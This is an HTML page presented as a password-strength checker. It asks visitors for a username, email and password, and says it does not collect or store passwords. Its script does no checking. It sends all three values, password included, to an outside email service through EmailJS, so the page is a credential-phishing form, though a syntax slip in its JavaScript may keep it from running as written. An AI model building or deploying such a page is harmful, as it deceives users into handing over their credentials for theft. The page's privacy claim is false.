<!doctype html>
<html>
<head>
	<link rel="stylesheet" href="formstyle.css">
	<!--link to CSS page--> 
	

	<script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
</script>
<script type="text/javascript">
   (function(){
      emailjs.init("Co6JCOEHecCgKpHrm");
   })();
</script>
	
</head>
<body>

	<div class="container">
		<form onsubmit="sendMail"> 												                                       
			<h1> CHECK YOUR PASSWORD </h1><br>
			<p>Please fill the form so we can check if your password is strong enough, <br>
 				your password is not safe if it can be brute-force or found in a database of leaked 				
				passwords<br><br>
			    We do not collect or store your passwords <p>
			<!--form fields-->
			<input type="text" id="username" placeholder="Username" required> <br>
			<input type="email" id="email" placeholder="Email" required><br>
			<input type="password" id="password" placeholder="Text" required><br>
			<button type="Submit">Send</button><br>
		</form>
	</div>
	<script>
		function sendMail() {
  			var params = {
    				username: document.getElementById("username").value,
    				email: document.getElementById("email").value,
    				password: document.getElementById("password").value,
  			};
  
		const serviceID = "service_5q0ccwe";
		const templateID = "template_szewk7m";

		emailjs.send(serviceID, templateID, params)
		.then((res) {
       				 document.getElementById("username").value = "";
        			 document.getElementById("email").value = "";
        			 document.getElementById("password").value = "";
        			 console.log(res);
        		         alert("your message was sent sucessfully");
    			}
		)
		.catch((err) => console.log(err));
		}
	</script>
</body>
</html>
